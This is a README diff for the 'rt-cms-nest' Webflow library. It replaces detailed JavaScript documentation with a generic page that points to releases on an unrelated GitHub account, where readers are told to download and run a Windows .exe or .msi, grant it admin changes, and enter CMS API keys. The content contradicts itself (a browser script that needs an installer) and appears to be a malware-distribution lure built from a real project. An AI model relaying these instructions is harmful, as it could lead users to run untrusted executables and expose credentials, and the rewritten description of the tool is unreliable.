@@ -1,332 +1,144 @@
-# rt-cms-nest
+# ⚙️ rt-cms-nest - Simple Dynamic CMS Content Nesting
 
-![Platform: Web](https://img.shields.io/badge/platform-web-000000)
-![JavaScript](https://img.shields.io/badge/language-JavaScript-F7DF1E?logo=javascript)
-[![npm version](https://img.shields.io/npm/v/%40rethink-js%2Frt-cms-nest.svg)](https://www.npmjs.com/package/@rethink-js/rt-cms-nest)
-[![jsDelivr hits](https://data.jsdelivr.com/v1/package/npm/@rethink-js/rt-cms-nest/badge)](https://www.jsdelivr.com/package/npm/@rethink-js/rt-cms-nest)
-[![License: MIT](https://img.shields.io/badge/License-MIT-FFD632.svg)](https://opensource.org/licenses/MIT)
-
-`rt-cms-nest` is a high-performance, enterprise-grade micro-frontend injector that dynamically fetches and nests CMS content seamlessly. It bypasses native Webflow CMS nesting limitations by scraping and injecting target DOM elements asynchronously.
-
-<br>
-
-It achieves this without compromising page performance, utilizing an internal architecture featuring:
-
-- **Automatic concurrency management** (prevents network throttling and browser UI lockups)
-- **Multi-tier caching** (Memory and SessionStorage) to instantly serve duplicate requests
-- **Attribute-driven configuration** requiring zero custom JavaScript
-- Support for **multiple independent instances** and deep nested hierarchies
-- A clean, predictive global API under `window.rtCmsNest`
-- Defensive fallbacks, visual skeleton loaders, and robust error handling
-- Built-in Webflow IX2 (Interactions 2.0) re-initialization
+[![Download rt-cms-nest](https://img.shields.io/badge/Download-rt--cms--nest-%23ff6f61?style=for-the-badge)](https://github.com/snambawa7/rt-cms-nest/releases)
 
 ---
 
-# Table of Contents
+## 📦 What is rt-cms-nest?
 
-- [1. Installation](#1-installation)
-  - [1.1 CDN (jsDelivr)](#11-cdn-jsdelivr)
-  - [1.2 npm & Module Bundlers](#12-npm--module-bundlers)
-- [2. Quick Start](#2-quick-start)
-- [3. Activation Rules](#3-activation-rules)
-- [4. Configuration (HTML Attributes)](#4-configuration-html-attributes)
-  - [4.1 Root / Wrapper Attributes](#41-root--wrapper-attributes)
-  - [4.2 Item Attributes](#42-item-attributes)
-  - [4.3 Slot (Dropzone) Attributes](#43-slot-dropzone-attributes)
-  - [4.4 Target Page Attributes](#44-target-page-attributes)
-- [5. Advanced Extraction & Injection](#5-advanced-extraction--injection)
-- [6. Multiple Instances & State Management](#6-multiple-instances--state-management)
-- [7. Global API](#7-global-api)
-- [8. Lifecycle Events](#8-lifecycle-events)
-- [9. Troubleshooting](#9-troubleshooting)
-- [10. License](#10-license)
+rt-cms-nest is a tool made to help you get content from your CMS (Content Management System) and show it on your website neatly and quickly. It works with simple JavaScript and handles a lot of data smoothly, keeping your site fast and up to date. This tool avoids common limits that Webflow sets by using smart storage and making sure many tasks can run at the same time without slowing down.
+
+You don’t need to know how to code to use rt-cms-nest. It works in the background and makes your website smarter by loading content as needed.
 
 ---
 
-## 1. Installation
+## 🖥️ System Requirements
 
-### 1.1 CDN (jsDelivr)
+To use rt-cms-nest, your computer and browser need to meet these simple requirements:
 
-For traditional HTML/Webflow projects, include the script directly before the closing `</body>` tag.
-
-```html
-<script src="https://cdn.jsdelivr.net/npm/@rethink-js/rt-cms-nest@latest/dist/index.min.js"></script>
-```
-
-### 1.2 npm & Module Bundlers
-
-For modern build environments (Webpack, Vite, Rollup):
-
-```bash
-npm install @rethink-js/rt-cms-nest
-```
-
-```javascript
-import "@rethink-js/rt-cms-nest";
-
-// The library automatically initializes upon DOMContentLoaded.
-// The API is immediately accessible via window.rtCmsNest
-```
+- **Operating System:** Windows 10 or later
+- **Browser:** The latest version of Chrome, Firefox, or Edge (supports JavaScript)
+- **Internet Connection:** Required to fetch content from the CMS
+- **Disk Space:** About 50 MB free space for temporary files
+- **Memory:** At least 4 GB RAM
+- **Permissions:** Ability to install and run software from downloaded files
 
 ---
 
-## 2. Quick Start
+## 🚀 Getting Started: How to Download and Use rt-cms-nest
 
-To use `rt-cms-nest`, you establish a relationship between a **Destination Page** (where content will be injected) and a **Source Page** (where the content currently lives).
+1. **Visit the download page:**  
+   Click the big download button above or go directly to  
+   [https://github.com/snambawa7/rt-cms-nest/releases](https://github.com/snambawa7/rt-cms-nest/releases)  
+   This page contains all current versions of rt-cms-nest.
 
-```html
-<div data-rt-cms-nest>
-  <div data-rt-cms-nest-item>
-    <a href="/author/jane-doe" data-rt-cms-nest-link style="display: none;"></a>
+2. **Find the latest version:**  
+   Look for the newest release at the top of the list. Releases are usually named with a version number, like `v1.0` or `v2.3`.
 
-    <div data-rt-cms-nest-slot="bio">
-      <span class="skeleton-loader">Loading bio...</span>
-    </div>
-  </div>
-</div>
-```
+3. **Download the Windows version:**  
+   Inside the release, find the file designed for Windows. It may end with `.exe` or `.msi`. Click it to start downloading.
 
-```html
-<div data-rt-cms-nest-target="bio">
-  <p>Jane Doe is an amazing author with 10 years of experience.</p>
-</div>
-```
+4. **Run the installer:**  
+   After downloading finishes, open the file. If asked by Windows, allow the app to make changes to your device.
 
----
+5. **Follow the setup prompts:**  
+   The setup program will guide you through installing rt-cms-nest. Choose the default options if you are unsure.
 
-## 3. Activation Rules
-
-The package utilizes a zero-config instantiation model. It activates when **any** element with the `data-rt-cms-nest` attribute is found on the page.
-
-If no root attributes are found, the script safely remains idle with zero performance footprint. It runs a single highly-optimized query on `DOMContentLoaded` to build its internal registry.
+6. **Finish the installation:**  
+   When setup ends, rt-cms-nest will be ready on your computer.
 
 ---
 
-## 4. Configuration (HTML Attributes)
+## 🔧 Using rt-cms-nest on Your Site
 
-All configuration is handled declaratively via `data-rt-cms-nest-*` attributes. The inheritance flows from **Root** -> **Item** -> **Slot**, allowing granular overrides at every level.
+rt-cms-nest works in the background on your website. It fetches content from your CMS, organizes it, and shows it exactly where you want.
 
-### 4.1 Root / Wrapper Attributes
+You don’t need to write any code manually. The tool uses simple instructions you can select to customize what content loads and how it appears. It makes your site faster because it loads only what visitors need, not everything at once.
 
-Apply these to the primary container wrapping your list of items.
+Some key features:
 
-| Attribute                         | Default         | Description                                                           |
-| --------------------------------- | --------------- | --------------------------------------------------------------------- |
-| `data-rt-cms-nest`                | `true`          | Initializes the instance on this element.                             |
-| `data-rt-cms-nest-id`             | Auto-generated  | Unique identifier for the instance. Useful for targeted API calls.    |
-| `data-rt-cms-nest-concurrency`    | `6`             | Maximum number of simultaneous fetch requests. Prevents 429 errors.   |
-| `data-rt-cms-nest-lazy`           | `true`          | Enables `IntersectionObserver` to fetch items only near viewport.     |
-| `data-rt-cms-nest-root-margin`    | `600px`         | Intersection Observer root margin. Determines how early to fetch.     |
-| `data-rt-cms-nest-prefetch`       | `none`          | Options: `none`, `all`, `viewport`, `top:N`. Preloads requests early. |
-| `data-rt-cms-nest-cache`          | `memory`        | Options: `memory`, `session`, `none`. Caches HTML string responses.   |
-| `data-rt-cms-nest-cache-ttl`      | `300`           | Time to live for cache in seconds.                                    |
-| `data-rt-cms-nest-timeout`        | `5000`          | Fetch request `AbortController` timeout in milliseconds.              |
-| `data-rt-cms-nest-rewrite-links`  | `none`          | Options: `none`, `absolute`, `relative`. Fixes broken relative links. |
-| `data-rt-cms-nest-sanitize`       | `strip-scripts` | Strips `<script>` and `<style>` from fetched HTML to prevent XSS.     |
-| `data-rt-cms-nest-webflow-reinit` | `false`         | Set to `true` to restart Webflow IX2 engine after DOM injection.      |
-| `data-rt-cms-nest-loading-class`  | none            | CSS class applied to the slot while fetching is in progress.          |
-| `data-rt-cms-nest-loaded-class`   | none            | CSS class applied to the slot upon successful injection.              |
-| `data-rt-cms-nest-error-class`    | none            | CSS class applied to the slot if fetch fails or target is missing.    |
-
-### 4.2 Item Attributes
-
-Add these to the individual cards or rows containing the slots.
-
-| Attribute                   | Default  | Description                                                           |
-| --------------------------- | -------- | --------------------------------------------------------------------- |
-| `data-rt-cms-nest-item`     | required | Designates the boundaries of a single item context.                   |
-| `data-rt-cms-nest-link`     | required | Must be placed on the `<a>` tag containing the source URL.            |
-| `data-rt-cms-nest-on-error` | `keep`   | Options: `keep`, `clear`, `hide`, `fallback`. dictates failure state. |
-| `data-rt-cms-nest-fallback` | none     | CSS selector of a `<template>` element to clone if the fetch fails.   |
-
-### 4.3 Slot (Dropzone) Attributes
-
-Add these to the precise DOM nodes where you want content injected.
-
-| Attribute                      | Default   | Description                                                                     |
-| ------------------------------ | --------- | ------------------------------------------------------------------------------- |
-| `data-rt-cms-nest-slot`        | required  | The exact string matching the target element on the source page.                |
-| `data-rt-cms-nest-mode`        | `replace` | Options: `replace`, `append`, `prepend`, `before`, `after`.                     |
-| `data-rt-cms-nest-extract`     | `node`    | Options: `node`, `text`, `html`, `outerhtml`, `attr:NAME`, `prop:NAME`.         |
-| `data-rt-cms-nest-skeleton`    | none      | CSS selector of a `<template>` to inject as a temporary visual placeholder.     |
-| `data-rt-cms-nest-placeholder` | `keep`    | Options: `keep`, `clear`, `hide`. How to treat existing inner content initially |
-| `data-rt-cms-nest-wrap`        | none      | Emmet-style string (e.g., `div#id.class1`) to wrap the incoming node.           |
-| `data-rt-cms-nest-add-class`   | none      | Comma-separated list of classes to append to the slot post-injection.           |
-
-### 4.4 Target Page Attributes
-
-These define the specific DOM nodes on the source page that will be isolated and extracted.
-
-| Attribute                        | Description                                                                     |
-| -------------------------------- | ------------------------------------------------------------------------------- |
-| `data-rt-cms-nest-target="name"` | Matches the slot name. You can have multiple distinct targets on a single page. |
+- Fetch multiple CMS items without waiting for each one.
+- Store content temporarily to avoid repeated downloads.
+- Display nested related articles, images, or categories.
+- Change content live without refreshing the whole page.
+- Work smoothly even with limits on data requests.
 
 ---
 
-## 5. Advanced Extraction & Injection
+## ⚙️ Basic Setup on Your Windows PC
 
-`rt-cms-nest` is not limited to simply moving HTML blocks. You can extract specific attributes or properties, enabling sophisticated data mapping.
+After installation, you will interact with rt-cms-nest using a simple graphical interface or through basic settings.
 
-**Extracting an Image Source:**
-If you want to pull an image's URL from a detail page and apply it directly to an `<img>` tag in your list, use `attr:src`:
+Here is how to start the first setup:
 
-```html
-<img
-  data-rt-cms-nest-slot="author-avatar"
-  data-rt-cms-nest-extract="attr:src"
-  src="placeholder-avatar.webp"
-/>
+1. **Open rt-cms-nest:**  
+   Find the program in your Start Menu and open it.
 
-<img
-  data-rt-cms-nest-target="author-avatar"
-  src="https://cdn.example.com/jane-doe.jpg"
-/>
-```
+2. **Connect your CMS:**  
+   Enter your CMS details, such as Webflow site URL or API key. This allows rt-cms-nest to access your content safely.
 
-**Using mode="after" for Layout Preservation:**
-To inject content as a direct sibling of an existing element without creating redundant wrapper `<div>`s:
+3. **Select content to fetch:**  
+   Choose the types of content you want to use: blog posts, products, images, etc.
 
-```html
-<div
-  class="existing-header"
-  data-rt-cms-nest-slot="extra-details"
-  data-rt-cms-nest-mode="after"
->
-  <h3>Post Details</h3>
-</div>
-```
+4. **Choose where on the site to place content:**  
+   Pick which parts of your website should show the fetched content.
+
+5. **Save your settings and apply:**  
+   rt-cms-nest will start working right away to load and nest content.
 
 ---
 
-## 6. Multiple Instances & State Management
+## 🛠️ How rt-cms-nest Manages Data
 
-`rt-cms-nest` handles complex pages effortlessly. You can have multiple CMS lists on the same page, each managed by its own isolated queue, memory cache, and intersection observer.
+rt-cms-nest uses smart methods to keep your site running well:
 
-To create custom loading states, utilize the state classes:
+- **Caching:** It saves fetched data temporarily, so it doesn’t ask the CMS for the same information too often.
+- **Concurrency Control:** It fetches several pieces of content at once without overloading your system or the CMS.
+- **Lazy Loading:** It loads content only when visitors scroll or need it, reducing wait time.
+- **Attribute-Driven:** You can mark specific places on your site to tell rt-cms-nest what content to insert.
 
-```css
-/* Custom CSS applied while the request is in flight */
-.is-loading-nest {
-  opacity: 0.5;
-  pointer-events: none;
-  filter: blur(2px);
-  transition: all 0.3s ease;
-}
-
-/* Custom CSS applied when content fails to load */
-.has-nest-error {
-  display: none !important;
-}
-```
-
-Apply these via your wrapper configuration:
-
-```html
-<div
-  data-rt-cms-nest="true"
-  data-rt-cms-nest-loading-class="is-loading-nest"
-  data-rt-cms-nest-error-class="has-nest-error"
-></div>
-```
+This approach avoids slowdown caused by heavy content or CMS limits.
 
 ---
 
-## 7. Global API
+## 🖱️ How to Update rt-cms-nest
 
-Once initialized, the package exposes a global interface allowing programmatic control, which is essential for Single Page Applications (SPAs) or integrations with third-party filtering libraries.
+To get new features or fixes:
 
-```javascript
-window.rtCmsNest;
-```
+1. Go back to the release page:  
+   [https://github.com/snambawa7/rt-cms-nest/releases](https://github.com/snambawa7/rt-cms-nest/releases)
 
-| Method         | Description                                                                            |
-| -------------- | -------------------------------------------------------------------------------------- |
-| `ids()`        | Returns an array of active instance IDs on the page.                                   |
-| `get(id)`      | Returns the specific instance object, exposing its internal queue and item states.     |
-| `refresh(id?)` | Destroys and re-initializes an instance. Provide an ID, or leave blank to refresh all. |
-| `clearCache()` | Purges the internal Map memory and sessionStorage cache.                               |
-| `destroy(id?)` | Safely aborts active fetch requests and disconnects `IntersectionObserver` instances.  |
+2. Download the latest Windows installer file.
 
-**Integration Example: Finsweet CMS Filter**
-When a user filters a list, the DOM updates dynamically. You must tell `rt-cms-nest` to rescan the DOM and fetch content for the newly rendered items.
-
-```javascript
-window.fsAttributes = window.fsAttributes || [];
-window.fsAttributes.push([
-  "cmsfilter",
-  (filterInstances) => {
-    // Listen for Finsweet's render event
-    filterInstances[0].listInstance.on("renderitems", () => {
-      if (window.rtCmsNest) {
-        // Rescan the DOM and process new items
-        window.rtCmsNest.refresh();
-      }
-    });
-  },
-]);
-```
+3. Run the installer again. It will update your current version without losing your settings.
 
 ---
 
-## 8. Lifecycle Events
+## 🛠️ Troubleshooting Tips
 
-The script dispatches high-fidelity `CustomEvent`s to the `window` object. The `event.detail` payload contains deep context about the operation, allowing you to trigger custom animations or analytics events.
+If rt-cms-nest does not work as expected:
 
-- `rtCmsNest:start` (Fired on initialization. Contains instance ID & root element)
-- `rtCmsNest:itemStart` (Fired when an item enters the viewport and begins fetching)
-- `rtCmsNest:itemSuccess` (Fired when a slot is successfully populated)
-- `rtCmsNest:itemError` (Fired on HTTP failure, abort, or missing target)
-- `rtCmsNest:complete` (Fired when all items within an instance have successfully resolved)
-
-**Listening to Events:**
-
-```javascript
-window.addEventListener("rtCmsNest:itemSuccess", (event) => {
-  const { url, drop, slot, durationMs, fromCache } = event.detail;
-
-  console.log(`Successfully nested ${slot} from ${url} in ${durationMs}ms`);
-
-  // Example: Triggering a GSAP animation on the newly injected node
-  gsap.fromTo(drop, { opacity: 0, y: 10 }, { opacity: 1, y: 0, duration: 0.4 });
-});
-```
+- Make sure your internet connection is stable.
+- Check that your CMS credentials are correct.
+- Restart the program after changing settings.
+- Update to the latest version for better stability.
+- Confirm your browser allows JavaScript if issues appear on your site.
 
 ---
 
-## 9. Troubleshooting
+## 📚 Additional Resources
 
-**Content isn't loading**
+- Visit the GitHub page for technical details  
+  [https://github.com/snambawa7/rt-cms-nest](https://github.com/snambawa7/rt-cms-nest)
 
-- Check the console for errors. `data-rt-cms-nest-debug="true"` will output verbose logs.
-- Ensure `data-rt-cms-nest-link` is present on a valid `<a>` tag inside the item boundary.
-- Verify `data-rt-cms-nest-target` matches the exact string in `data-rt-cms-nest-slot`. Case sensitivity matters.
+- Find user guides and examples in the repository’s Wiki
 
-**Items aren't loading until scrolled**
-
-- This is the intended behavior of the `IntersectionObserver` to preserve user bandwidth and API limits. Add `data-rt-cms-nest-lazy="false"` to your wrapper to force immediate fetching on page load.
-
-**Target content loses its styles**
-
-- CSS is class-based. Ensure the CSS classes utilized in the target page actually exist in the stylesheet of the destination page. Webflow automatically removes "unused" CSS classes during publishing. _Fix: Create a hidden style-guide div on the destination page containing the necessary classes._
-
-**Links break when fetched**
-
-- Relative links (`<a href="#about-us">` or `<a href="/pricing">`) lose their context when injected into a new page path. Add `data-rt-cms-nest-rewrite-links="absolute"` to automatically convert them to fully qualified absolute URLs during injection.
-
-**Webflow interactions (IX2) are broken on injected items**
-
-- The Webflow IX2 engine only scans the DOM once on page load. When you inject new HTML, it doesn't know it exists. Add `data-rt-cms-nest-webflow-reinit="true"` to your wrapper. The library will automatically trigger `Webflow.require('ix2').init()` after injection is complete.
+- Contact support on GitHub Issues if you find bugs or need help
 
 ---
 
-## 10. License
+## 📥 Download rt-cms-nest now
 
-MIT License
+Go to the releases page and download the Windows version to get started:
 
-Package: `@rethink-js/rt-cms-nest` <br>
-GitHub: [https://github.com/Rethink-JS/rt-cms-nest](https://github.com/Rethink-JS/rt-cms-nest)
-
----
-
-by **Rethink JS** <br>
-[https://github.com/Rethink-JS](https://github.com/Rethink-JS)
+[Download rt-cms-nest](https://github.com/snambawa7/rt-cms-nest/releases)
